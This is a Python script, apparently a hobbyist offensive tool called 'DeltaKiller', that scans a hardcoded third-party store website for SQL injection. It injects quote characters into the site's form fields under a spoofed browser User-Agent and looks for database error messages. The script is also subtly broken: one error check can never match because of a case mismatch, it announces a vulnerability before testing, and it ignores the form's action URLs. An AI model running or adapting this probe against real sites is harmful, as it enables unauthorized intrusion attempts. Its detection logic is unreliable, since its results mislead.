import requests
from bs4 import BeautifulSoup
import sys
from urllib.parse import urljoin

banner = """
▓█████▄ ▓█████  ██▓  ▄▄▄█████▓ ▄▄▄          ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███  
▒██▀ ██▌▓█   ▀ ▓██▒  ▓  ██▒ ▓▒▒████▄        ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
░██   █▌▒███   ▒██░  ▒ ▓██░ ▒░▒██  ▀█▄     ▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒
░▓█▄   ▌▒▓█  ▄ ▒██░  ░ ▓██▓ ░ ░██▄▄▄▄██    ▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
░▒████▓ ░▒████▒░██████▒▒██▒ ░  ▓█   ▓██▒   ▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒
 ▒▒▓  ▒ ░░ ▒░ ░░ ▒░▓  ░▒ ░░    ▒▒   ▓▒█░   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ▒  ▒  ░ ░  ░░ ░ ▒  ░  ░      ▒   ▒▒ ░   ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░  ░    ░     ░ ░   ░        ░   ▒      ░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░ 
   ░       ░  ░    ░  ░             ░  ░   ░  ░    ░      ░  ░    ░  ░   ░  ░   ░     
 ░                                                                                                                                                                  
"""
print(banner)

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0"

def get_forms(url):
    soup = BeautifulSoup(s.get(url).content, "html.parser")
    return soup.find_all("form")

def form_details(form):
    detailsOfForm = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get")
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    detailsOfForm['action'] = action
    detailsOfForm['method'] = method
    detailsOfForm['inputs'] = inputs
    return detailsOfForm

def decode_content(response):
    try:
        return response.content.decode('utf-8')
    except UnicodeDecodeError:
        return response.content.decode('iso-8859-1')

def vulnerable(response):
    errors = {"quoted string not properly terminated", "You have an error in your SQL syntax", "unclosed quotation mark after the character string"}
    content = decode_content(response)
    for error in errors:
        if error in content.lower():
            return True
    return False

def sql_vuln_scan(url):
    forms = get_forms(url)
    print(f"[+] VULN Detected ;) {len(forms)} form(s) on {url}.")

    for form in forms:
        details = form_details(form)
        for i in "\"'":
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag['name']] = input_tag["value"] + i
                elif input_tag["type"] != "submit":
                    data[input_tag['name']] = f"test{i}"

            print(url)
            form_details(form)

            res = None
            if details["method"].lower() == "post":
                res = s.post(url, data=data)
            elif details["method"].lower() == "get":
                res = s.get(url, params=data)

            if res and vulnerable(res):
                print("SQL INJECTion found: ", url)
            else:
                print("NO SQL INJ")
                break

if __name__ == "__main__":
    urlToBeChecked = "https://story.agokystore.com"
    sql_vuln_scan(urlToBeChecked)
